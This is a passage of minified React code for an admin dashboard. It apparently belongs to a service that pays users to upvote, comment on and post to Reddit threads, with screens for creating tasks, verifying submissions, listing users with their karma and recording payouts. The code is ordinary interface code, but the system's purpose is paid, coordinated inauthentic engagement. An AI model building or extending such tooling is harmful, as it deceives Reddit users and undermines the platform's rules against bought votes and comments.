gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:me.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):me.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:me.message})]}),n.jsx("button",{onClick:()=>Qt(d=>({...d,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"max-w-4xl mx-auto animate-in fade-in slide-in-from-bottom-4 duration-500",children:[n.jsxs("header",{className:"mb-8 sm:mb-10",children:[n.jsx("div",{className:"flex items-center gap-3 mb-2",children:n.jsx("div",{className:"px-3 py-1 bg-blue-600/10 text-blue-500 rounded-full text-[10px] font-bold uppercase tracking-widest border border-blue-500/20",children:"Admin Control"})}),n.jsx("h1",{className:"text-2xl sm:text-3xl font-black tracking-tighter uppercase italic",children:f==="Tasks"?"Task Management":f==="Users"?"User Management":f==="Withdrawals"?"Payout Records":f==="Reports"?"Task Reports":"Submission Verifications"}),n.jsx("p",{className:"text-xs sm:text-sm text-gray-500 mt-1",children:f==="Tasks"?"Distribute new tasks to the network.":f==="Users"?"View all registered users and their details.":f==="Withdrawals"?"View historical payout data and completed transactions.":f==="Reports"?"Review problems reported by users.":"Review and approve user submissions."})]}),n.jsxs("div",{className:"flex flex-wrap bg-white/[0.03] border border-white/5 p-1 rounded-2xl mb-8 sm:mb-12 w-full sm:w-fit gap-1",children:[n.jsx("button",{onClick:()=>w("Tasks"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Tasks"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Create"}),n.jsxs("button",{onClick:()=>w("Verification"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${f==="Verification"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Verify",a.filter(d=>d.status==="submitted").length>0&&n.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:a.filter(d=>d.status==="submitted").length})]}),n.jsx("button",{onClick:()=>w("Submissions"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Submissions"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"History"}),n.jsx("button",{onClick:()=>w("Users"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Users"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Users"}),n.jsx("button",{onClick:()=>w("Withdrawals"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all ${f==="Withdrawals"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:"Paid"}),n.jsxs("button",{onClick:()=>w("Reports"),className:`flex-1 sm:flex-none px-4 sm:px-8 py-2.5 rounded-xl text-[10px] md:text-xs font-black uppercase tracking-widest transition-all relative ${f==="Reports"?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:["Reports",h.length>0&&n.jsx("span",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 rounded-full text-[8px] flex items-center justify-center animate-pulse",children:h.length})]})]}),f==="Tasks"?n.jsxs(n.Fragment,{children:[n.jsxs("form",{onSubmit:xl,className:"space-y-6 sm:space-y-8",children:[n.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-8",children:[n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Mr,{size:14})," Task Tier"]}),n.jsxs("div",{className:"relative",ref:Gr,children:[n.jsxs("div",{onClick:()=>Kr(!Hr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:"text-white font-medium",children:Ne}),n.jsx(bt,{size:18,className:`text-gray-500 transition-transform ${Hr?"rotate-180":""}`})]}),Hr&&n.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["Tier 1","Tier 2","Tier 3"].map(d=>n.jsx("div",{onClick:()=>{F(d),Kr(!1)},className:`px-4 py-3 rounded-xl text-xs font-bold cursor-pointer transition-all mb-1 last:mb-0 ${Ne===d?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:d},d))})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Ui,{size:14})," Subreddit"]}),n.jsx("input",{type:"text",required:!0,placeholder:"e.g. MovingToLondon",value:ce,onChange:d=>ue(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Hm,{size:14})," Task Title"]}),n.jsx("input",{type:"text",required:!0,placeholder:"e.g. Upvote and Comment on r/tech",value:ze,onChange:d=>Ge(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Di,{size:14})," Category"]}),n.jsxs("div",{className:"relative",ref:Qr,children:[n.jsxs("div",{onClick:()=>Yr(!Jr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:"text-white font-bold uppercase tracking-tight",children:O}),n.jsx(bt,{size:18,className:`text-gray-500 transition-transform ${Jr?"rotate-180":""}`})]}),Jr&&n.jsx("div",{className:"absolute top-full left-0 right-0 mt-2 p-2 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:["COMMENT","POST","UPVOTE","REPLY TO COMMENT","REPOST"].map(d=>n.jsx("div",{onClick:()=>{X(d),Yr(!1)},className:`px-4 py-3 rounded-xl text-[10px] font-black cursor-pointer transition-all mb-1 last:mb-0 tracking-widest uppercase ${O===d?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:d},d))})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Er,{size:14})," Reward Amount"]}),n.jsxs("div",{className:"relative",children:[n.jsx("span",{className:"absolute left-5 top-1/2 -translate-y-1/2 text-gray-500 text-sm",children:"$"}),n.jsx("input",{type:"text",required:!0,placeholder:"0.50",value:Le,onChange:d=>Bt(d.target.value),className:"w-full pl-10 pr-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Ht,{size:14})," Deadline"]}),n.jsxs("div",{className:"relative",ref:Zr,children:[n.jsxs("div",{onClick:()=>vn(!Xr),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:Y?"text-white font-medium":"text-gray-600",children:Y?new Date(Y).toLocaleString([],{dateStyle:"medium",timeStyle:"short"}):"Select date and time"}),n.jsx(Ht,{size:18,className:`text-gray-500 group-hover:text-blue-500 transition-colors ${Xr?"text-blue-500":""}`})]}),Xr&&n.jsxs("div",{className:"absolute top-full left-0 right-0 sm:right-auto sm:w-80 mt-2 p-4 bg-[#0a0a0a] border border-white/10 rounded-3xl shadow-2xl z-[60] animate-in fade-in slide-in-from-top-2 duration-200",children:[n.jsxs("div",{className:"flex items-center justify-between mb-4 px-1",children:[n.jsx("button",{type:"button",onClick:()=>wn(new Date(le.getFullYear(),le.getMonth()-1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:n.jsx(bt,{size:18,className:"rotate-90"})}),n.jsx("span",{className:"text-xs font-black uppercase italic tracking-widest text-blue-500",children:new Intl.DateTimeFormat("en-US",{month:"long",year:"numeric"}).format(le)}),n.jsx("button",{type:"button",onClick:()=>wn(new Date(le.getFullYear(),le.getMonth()+1)),className:"p-1.5 hover:bg-white/5 rounded-lg text-gray-400 transition-colors",children:n.jsx(bt,{size:18,className:"-rotate-90"})})]}),n.jsxs("div",{className:"grid grid-cols-7 gap-1 mb-2",children:[["S","M","T","W","T","F","S"].map(d=>n.jsx("div",{className:"text-[10px] font-black text-gray-600 text-center py-1 uppercase",children:d},d)),Array.from({length:new Date(le.getFullYear(),le.getMonth(),1).getDay()}).map((d,N)=>n.jsx("div",{},`empty-${N}`)),Array.from({length:new Date(le.getFullYear(),le.getMonth()+1,0).getDate()}).map((d,N)=>{const E=N+1,P=Y&&new Date(Y).getDate()===E&&new Date(Y).getMonth()===le.getMonth()&&new Date(Y).getFullYear()===le.getFullYear();return n.jsx("div",{onClick:()=>{const _=new Date(le.getFullYear(),le.getMonth(),E),Z=Y?new Date(Y):new Date;_.setHours(Z.getHours()),_.setMinutes(Z.getMinutes());const Re=Tt=>Tt.toString().padStart(2,"0");Et(`${_.getFullYear()}-${Re(_.getMonth()+1)}-${Re(_.getDate())}T${Re(_.getHours())}:${Re(_.getMinutes())}`)},className:`aspect-square flex items-center justify-center text-[11px] font-bold rounded-lg cursor-pointer transition-all ${P?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:E},E)})]}),n.jsxs("div",{className:"mt-4 pt-4 border-t border-white/5 flex items-center justify-between gap-4",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(Ht,{size:14,className:"text-gray-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-wider",children:"Time"})]}),n.jsxs("div",{className:"flex items-center gap-1",children:[n.jsx("input",{type:"number",min:"0",max:"23",value:Y?new Date(Y).getHours():12,onChange:d=>{const N=Math.max(0,Math.min(23,parseInt(d.target.value)||0)),E=Y?new Date(Y):new Date;E.setHours(N);const P=_=>_.toString().padStart(2,"0");Et(`${E.getFullYear()}-${P(E.getMonth()+1)}-${P(E.getDate())}T${P(E.getHours())}:${P(E.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"}),n.jsx("span",{className:"text-gray-600 font-bold",children:":"}),n.jsx("input",{type:"number",min:"0",max:"59",value:Y?new Date(Y).getMinutes():0,onChange:d=>{const N=Math.max(0,Math.min(59,parseInt(d.target.value)||0)),E=Y?new Date(Y):new Date;E.setMinutes(N);const P=_=>_.toString().padStart(2,"0");Et(`${E.getFullYear()}-${P(E.getMonth()+1)}-${P(E.getDate())}T${P(E.getHours())}:${P(E.getMinutes())}`)},className:"w-10 py-1 bg-white/5 border border-white/5 rounded-md text-center text-xs font-bold focus:border-blue-500 outline-none"})]})]})]})]})]})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(Ui,{size:14})," Target Reddit URL"]}),n.jsx("input",{type:"url",required:!0,placeholder:"https://www.reddit.com/r/...",value:gn,onChange:d=>Vr(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 shadow-inner"})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsxs("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:[n.jsx(lr,{size:14})," Assign to User"]}),n.jsxs("div",{className:"relative",ref:ts,children:[n.jsxs("div",{onClick:()=>Yt(!es),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-all text-sm group",children:[n.jsx("span",{className:Je==="All"?"text-gray-500":"text-white font-medium",children:Sl}),n.jsx(bt,{size:18,className:`text-gray-500 transition-transform ${es?"rotate-180":""}`})]}),es&&n.jsxs("div",{className:"absolute top-full left-0 right-0 mt-2 p-3 bg-[#0a0a0a] border border-white/10 rounded-2xl shadow-2xl z-50 animate-in fade-in slide-in-from-top-2 duration-200",children:[n.jsxs("div",{className:"relative mb-3",children:[n.jsx(ku,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:14}),n.jsx("input",{type:"text",placeholder:"Search server or reddit name...",value:Ct,onChange:d=>bn(d.target.value),autoFocus:!0,className:"w-full pl-10 pr-4 py-2.5 bg-white/[0.05] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-xs"})]}),n.jsxs("div",{className:"max-h-60 overflow-y-auto space-y-1 custom-scrollbar",children:[n.jsx("div",{onClick:()=>{Jt("All"),Yt(!1)},className:`px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all ${Je==="All"?"bg-blue-600 text-white":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:"Everyone (Public)"}),_n.map(d=>n.jsxs("div",{onClick:()=>{Jt(d.email),Yt(!1)},className:`px-4 py-2.5 rounded-xl text-xs cursor-pointer transition-all ${Je===d.email?"bg-blue-600 text-white font-bold":"text-gray-400 hover:bg-white/5 hover:text-white"}`,children:[n.jsx("div",{className:"font-bold",children:d.server_username||d.email.split("@")[0]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsxs("div",{className:"text-[10px] opacity-60",children:["u/",d.reddit_username||"not_connected"]}),d.reddit_karma!=null?n.jsxs("div",{className:"text-[10px] opacity-60 text-blue-400",children:[" ",d.reddit_karma.toLocaleString()," karma"]}):d.reddit_username&&d.reddit_username!=="not_connected"?n.jsx("div",{className:"text-[10px] opacity-40 text-blue-400 animate-pulse",children:" fetching karma..."}):null,d.discord_username&&n.jsxs("div",{className:"text-[10px] opacity-60 flex items-center gap-1",children:[n.jsx(Ut,{size:10})," ",d.discord_username]})]})]},d.email)),_n.length===0&&Ct!==""&&n.jsxs("div",{className:"py-8 text-center text-gray-600 text-xs italic",children:['No users found matching "',Ct,'"']})]})]})]}),n.jsx("p",{className:"text-[10px] text-gray-600 ml-1",children:"Select a specific user or keep it public."})]}),n.jsxs("div",{className:"space-y-3",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-wider ml-1 flex items-center gap-2",children:"Instructions for Users"}),n.jsx("textarea",{rows:5,required:!0,placeholder:"Detail exactly what the user needs to do...",value:yn,onChange:d=>qr(d.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm placeholder:text-gray-600 resize-none shadow-inner"})]}),n.jsxs("div",{className:"flex flex-col sm:flex-row gap-4 pt-6",children:[n.jsxs("button",{type:"button",onClick:jn,className:"w-full sm:w-auto px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all flex items-center justify-center gap-2",children:[n.jsx(Lr,{size:18}),x?"Cancel Edit":"Reset Form"]}),n.jsxs("button",{type:"submit",className:"w-full sm:flex-1 py-4 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 flex items-center justify-center gap-2 group",children:[n.jsx(un,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"}),x?"Update Task":"Publish Task to Network"]})]})]}),n.jsxs("section",{className:"mt-20",children:[n.jsx("h2",{className:"text-xl font-bold mb-8",children:"Existing Tasks"}),n.jsx("div",{className:"space-y-4",children:a.filter(d=>d.status!=="verified").length>0?a.filter(d=>d.status!=="verified").map(d=>n.jsx("div",{className:`p-6 rounded-3xl border transition-all ${d.is_hidden?"bg-white/[0.01] border-white/5 opacity-50":"bg-white/[0.03] border-white/10"}`,children:n.jsxs("div",{className:"flex items-center justify-between gap-4",children:[n.jsxs("div",{className:"flex-1",children:[n.jsxs("div",{className:"flex items-center gap-3 mb-1",children:[n.jsx("span",{className:"text-xs font-black text-blue-500",children:d.task_id_display}),n.jsx("h3",{className:"font-bold",children:d.title}),n.jsx("span",{className:`text-[9px] uppercase font-black px-2 py-0.5 rounded ${d.tier==="Tier 3"?"bg-red-500/10 text-red-500":d.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:d.tier}),n.jsx("span",{className:"text-[10px] uppercase font-bold text-gray-500 bg-white/5 px-2 py-0.5 rounded",children:d.category}),n.jsx("span",{className:`text-[10px] font-bold px-2 py-0.5 rounded ${d.assigned_to==="All"?"text-emerald-500 bg-emerald-500/10":"text-orange-500 bg-orange-500/10"}`,children:d.assigned_to==="All"?"PUBLIC":`PRIVATE: ${d.assigned_to}`})]}),n.jsx("p",{className:"text-xs text-gray-500 truncate max-w-md",children:d.reddit_url})]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("button",{onClick:()=>vl(d),className:"p-2 hover:bg-white/10 rounded-lg text-gray-400",title:d.is_hidden?"Show":"Hide",children:d.is_hidden?n.jsx(Bm,{size:18}):n.jsx(bu,{size:18})}),n.jsx("button",{onClick:()=>gl(d),className:"p-2 hover:bg-blue-600/20 rounded-lg text-blue-500",title:"Edit",children:n.jsx(ju,{size:18})}),n.jsx("button",{onClick:()=>yl(d.id),className:"p-2 hover:bg-red-600/20 rounded-lg text-red-500",title:"Delete",children:n.jsx(Lr,{size:18})})]})]})},d.id)):n.jsx("p",{className:"text-gray-500 text-center py-10",children:"No active tasks found in database."})})]})]}):f==="Verification"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsx("h2",{className:"text-xl font-bold mb-8 italic uppercase tracking-tight",children:"Pending Submissions"}),a.filter(d=>d.status==="submitted").length>0?a.filter(d=>d.status==="submitted").map(d=>{var N,E,P;return n.jsx("div",{className:"bg-white/[0.02] border border-white/5 rounded-[32px] p-5 sm:p-8 hover:border-blue-500/20 transition-all",children:n.jsxs("div",{className:"flex flex-col md:flex-row justify-between gap-6",children:[n.jsxs("div",{className:"flex-1 space-y-4",children:[n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("span",{className:"text-[10px] font-black text-blue-500",children:d.task_id_display}),n.jsx("h3",{className:"font-bold text-white text-lg",children:d.title}),n.jsx("span",{className:"text-[9px] font-black bg-amber-500/10 text-amber-500 px-2 py-0.5 rounded uppercase",children:d.tier})]}),n.jsxs("div",{className:"flex flex-wrap gap-4 text-[11px] text-gray-500",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(lr,{size:14}),n.jsx("span",{className:"font-bold text-gray-300",children:d.claimed_by})]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(Er,{size:14}),n.jsx("span",{className:"font-bold text-emerald-500",children:d.reward})]})]}),n.jsxs("div",{className:"space-y-3 pt-4",children:[n.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Main Link"}),n.jsx("a",{href:(N=d.submission_data)==null?void 0:N.main_link,target:"_blank",rel:"noreferrer",className:"text-xs text-blue-500 hover:underline break-all",children:(E=d.submission_data)==null?void 0:E.main_link})]}),((P=d.submission_data)==null?void 0:P.random_comments)&&d.submission_data.random_comments.some(_=>_!=="")&&n.jsxs("div",{className:"p-4 bg-black/40 rounded-2xl border border-white/5",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest block mb-2",children:"Random Comments"}),n.jsx("div",{className:"space-y-2",children:d.submission_data.random_comments.map((_,Z)=>_&&n.jsxs("a",{href:_,target:"_blank",rel:"noreferrer",className:"text-[10px] text-gray-400 hover:text-white block hover:underline truncate",children:[Z+1,". ",_]},Z))})]})]})]}),n.jsxs("div",{className:"flex flex-row md:flex-col gap-3 justify-end",children:[n.jsxs("button",{onClick:()=>wl(d),className:"flex-1 md:flex-none px-8 py-4 bg-emerald-600 text-white rounded-2xl font-black text-sm hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2",children:[n.jsx(Fe,{size:18,strokeWidth:3}),"VERIFY"]}),n.jsxs("button",{onClick:()=>bl(d),className:"flex-1 md:flex-none px-8 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 flex items-center justify-center gap-2",children:[n.jsx(re,{size:18,strokeWidth:3}),"REJECT"]}),n.jsxs("button",{onClick:()=>kn(d.claimed_by),className:"flex-1 md:flex-none px-8 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/10 transition-all flex items-center justify-center gap-2",children:[n.jsx(Ut,{size:18}),"ALERT"]})]})]})},d.id)}):n.jsxs("div",{className:"py-20 text-center bg-white/[0.01] border border-dashed border-white/10 rounded-[32px]",children:[n.jsx(ir,{size:48,className:"mx-auto text-gray-700 mb-4"}),n.jsx("p",{className:"text-gray-500 font-bold uppercase tracking-widest text-xs",children:"All caught up! No pending submissions."})]})]}):f==="Users"?n.jsxs("section",{className:"space-y-6 animate-in fade-in slide-in-from-right-4 duration-500",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("h2",{className:"text-xl font-bold italic uppercase tracking-tight",children:"Registered Users"}),n.jsx("button",{onClick:()=>ss(!0),className:"p-2 hover:bg-white/5 rounded-xl text-gray-500 hover:text-blue-500 transition-all group",title:"Refresh Karma for everyone",children:n.jsx(Ht,{size:16,className:"group-hover:rotate-180 transition-transform duration-500"})})]}),n.jsxs("div",{className:"px-4 py-2 bg-white/[0.03] border border-white/5 rounded-2xl",children:[n.jsx("span",{className:"text-[10px] font-black text-gray-500 uppercase tracking-widest",children:"Total: "}),n.jsx("span",{className:"text-sm font-black text-white",children:l.length})]})]}),l.length>0?n.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:l.map(d=>{const N=a.filter(_=>_.claimed_by===d.email&&(_.status==="verified"||_.status==="submitted")),E=oe===d.email,P=c.filter(_=>_.user_email===d.email&&_.status==="pending");return n.jsxs("div",{className:`bg-white/[0.02] border rounded-[28px] p-4 sm:p-6 transition-all ${P.length>0?"border-red-500/30":"border-white/5 hover:border-blue-500/20"}`,children:[n.jsxs("div",{className:"flex items-start gap-4 mb-4",children:[n.jsxs("div",{className:"relative",children:[n.jsx("div",{className:"w-12 h-12 bg-gradient-to-br from-blue-600 to-purple-600 rounded-2xl flex items-center justify-center text-white font-black text-lg flex-shrink-0",children:(d.server_username||d.email)[0].toUpperCase()}),P.length>0&&n.jsx("div",{className:"absolute -top-1 -right-1 w-4 h-4 bg-red-500 border-2 border-[#0a0a0a] rounded-full animate-pulse shadow-lg shadow-red-500/40"})]}),n.jsxs("div",{className:"flex-1 min-w-0",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("h3",{className:"font-bold text-white text-sm truncate",children:d.server_username||d.email.split("@")[0]}),P.length>0&&n.jsx("span",{className:"text-[8px] font-black bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded uppercase tracking-tighter",children:"Withdrawal Req"})]}),n.jsx("p",{className:"text-[11px] text-gray-500 truncate",children:d.email}),d.reddit_username&&n.jsxs("div",{className:"flex items-center gap-2 mt-1",children:[n.jsxs("a",{href:`https://reddit.com/u/${d.reddit_username}`,target:"_blank",rel:"noreferrer",className:"text-[10px] text-orange-500 font-bold hover:underline flex items-center gap-1",children:["u/",d.reddit_username,n.jsx(pa,{size:10})]}),d.reddit_karma!=null?n.jsxs("span",{className:"text-[10px] text-blue-400 font-bold",children:[" ",d.reddit_karma.toLocaleString()," karma"]}):n.jsx("span",{className:"text-[10px] text-blue-400/40 font-bold animate-pulse",children:" fetching..."})]})]})]}),n.jsxs("div",{className:"grid grid-cols-1 gap-2 mb-4",children:[n.jsxs("div",{className:"flex items-center justify-between p-3 bg-emerald-500/5 border border-emerald-500/10 rounded-xl",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(dn,{size:14,className:"text-emerald-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Current Balance"})]}),n.jsxs("span",{className:"text-sm font-black text-emerald-500",children:["$",(d.balance||0).toFixed(2)]})]}),P.length>0&&n.jsx("div",{className:"space-y-2",children:P.map(_=>n.jsxs("div",{className:"p-3 bg-red-500/5 border border-red-500/10 rounded-xl",children:[n.jsxs("div",{className:"flex items-center justify-between mb-2",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(Er,{size:14,className:"text-red-500"}),n.jsxs("div",{className:"flex flex-col",children:[n.jsx("span",{className:"text-[10px] font-black text-red-500 uppercase",children:"Withdrawal Request"}),n.jsx("span",{className:"text-[9px] font-mono text-gray-500",children:_.transaction_id})]})]}),n.jsxs("span",{className:"text-sm font-black text-red-500",children:["$",_.amount.toFixed(2)]})]}),n.jsxs("div",{className:"flex items-center justify-between gap-3 px-2 py-1.5 bg-white/[0.03] rounded-lg",children:[n.jsxs("div",{className:"flex items-center gap-2 flex-1 min-w-0",children:[n.jsx("img",{src:Ya[_.payout_method.type],alt:_.payout_method.label,className:"w-3.5 h-3.5 object-contain"}),n.jsxs("div",{className:"flex flex-col min-w-0",children:[n.jsx("span",{className:"text-[9px] font-black text-gray-400 uppercase leading-none mb-0.5",children:_.payout_method.label}),n.jsx("span",{className:"text-[10px] font-bold text-gray-200 truncate",children:_.payout_method.value})]})]}),n.jsx("button",{onClick:()=>kl(_),className:"px-3 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-[9px] font-black rounded-lg transition-all shadow-lg shadow-emerald-600/10 whitespace-nowrap",children:"PAID"})]})]},_.id))})]}),n.jsxs("div",{className:"mb-4",children:[n.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[n.jsx(ol,{size:14,className:"text-gray-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Payout Methods"})]}),d.payout_methods&&d.payout_methods.length>0?n.jsx("div",{className:"flex flex-wrap gap-2",children:d.payout_methods.map(_=>n.jsxs("div",{className:"flex items-center gap-2 px-3 py-1.5 bg-white/[0.03] border border-white/5 rounded-xl",children:[n.jsx("img",{src:Ya[_.type],alt:_.label,className:"w-4 h-4 object-contain"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-300 truncate max-w-[100px]",children:_.value})]},_.id))}):n.jsx("p",{className:"text-[10px] text-gray-600 italic",children:"No payout methods"})]}),n.jsxs("div",{children:[n.jsxs("button",{onClick:()=>yt(E?null:d.email),className:"w-full flex items-center justify-between p-3 bg-white/[0.02] border border-white/5 rounded-xl hover:bg-white/[0.04] transition-all",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx(ir,{size:14,className:"text-blue-500"}),n.jsx("span",{className:"text-[10px] font-bold text-gray-400 uppercase",children:"Completed Tasks"})]}),n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("span",{className:"text-xs font-black text-white",children:N.length}),n.jsx(bt,{size:14,className:`text-gray-500 transition-transform ${E?"rotate-180":""}`})]})]}),E&&N.length>0&&n.jsx("div",{className:"mt-2 p-3 bg-black/40 rounded-xl border border-white/5 space-y-2 max-h-48 overflow-y-auto",children:N.map(_=>{var Z;return n.jsxs("div",{className:"flex items-center justify-between gap-2 p-2 bg-white/[0.02] rounded-lg",children:[n.jsxs("div",{className:"flex-1 min-w-0",children:[n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("span",{className:"text-[9px] font-black text-blue-500",children:_.task_id_display}),n.jsx("span",{className:`text-[8px] font-black px-1.5 py-0.5 rounded uppercase ${_.status==="verified"?"bg-emerald-500/10 text-emerald-500":"bg-amber-500/10 text-amber-500"}`,children:_.status})]}),n.jsx("p",{className:"text-[10px] text-gray-300 truncate",children:_.title})]}),((Z=_.submission_data)==null?void 0:Z.main_link)&&n.jsx("a",{href:_.submission_data.main_link,target:"_blank",rel:"noreferrer",className:"p-1.5 text-gray-500 hover:text-blue-500 hover:bg-blue-500/10 rounded-lg transition-all flex-shrink-0",title:"View 